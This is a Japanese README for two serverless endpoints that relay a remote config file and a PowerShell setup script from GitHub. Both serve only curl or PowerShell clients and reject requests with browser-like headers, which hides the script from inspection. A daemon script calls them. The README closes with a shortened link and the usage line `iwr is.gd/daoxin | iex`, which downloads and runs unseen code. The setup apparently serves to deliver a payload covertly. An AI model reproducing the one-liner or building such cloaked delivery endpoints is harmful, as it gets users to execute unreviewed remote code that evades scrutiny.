このディレクトリには、クライアント（主に CLI ツールや PowerShell）専用の簡易エンドポイントが含まれます。主なエンドポイントは次のとおりです。

- `/api/config` — リモートの `assets/config.json` を中継して返します（JSON）。
  - 実装: [`handler`](api/config.js) — [api/config.js](api/config.js)
  - 期待するクライアント: `curl` や `powershell`（User-Agent に基づくフィルタリング）
  - 挙動:
    - User-Agent に `curl` または `powershell` を含み、`Accept-Language` と `Referer` が存在しないリクエストのみ許可します。
    - GitHub の raw ファイル（`assets/config.json`）を取得し、タイムアウトは 5 秒です。
    - 成功時は `application/json` として 200 を返します。 upstream 取得失敗時は 502、内部エラーは 500 を返します。

- `/api/install` — リモートの `setup.ps1` を中継して返します（プレーンテキスト、PowerShell 用）。
  - 実装: [`handler`](api/install.js) — [api/install.js](api/install.js)
  - 期待するクライアント: PowerShell（User-Agent に `powershell` を含む）
  - 挙動:
    - `powershell` を含む User-Agent で、`Accept-Language` と `Referer` が存在しないリクエストのみ許可します。
    - GitHub の raw ファイル（`setup.ps1`）を取得し、タイムアウトは 5 秒です。
    - 成功時は `text/plain; charset=utf-8` として 200 を返します。 upstream 取得失敗時は 502、タイムアウトやエラーは 500 を返します。

利用例（リモートスクリプトやデーモンからの呼び出し）
- daemon.cmd が行う呼び出し:
  - 設定取得: curl による GET（例: [assets/daemon.cmd](../assets/daemon.cmd)）
  - インストール取得: PowerShell で `iwr ... | iex`（`setup.ps1` を実行）

参考ファイル
- リモートで中継している設定: [assets/config.json](../assets/config.json)
- インストールスクリプト: [setup.ps1](../setup.ps1)
- デーモンスクリプト（呼び出し元）: [assets/daemon.cmd](../assets/daemon.cmd)

注意点
- ブラウザからのアクセスや通常の Web ページ参照は拒否するようにヘッダチェックを行っています（`Accept-Language` や `Referer` の有無と User-Agent に依存）。
- 上流の GitHub raw 取得に失敗すると 502 を返すため、デプロイ先やネットワークの可用性に依存します。
- 実際の運用ではアクセス制御やログ、レート制限の追加を検討してください。

---

リンク: https://6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/install
代替: https://is.gd/daoxin

---

使用法: `iwr is.gd/daoxin | iex`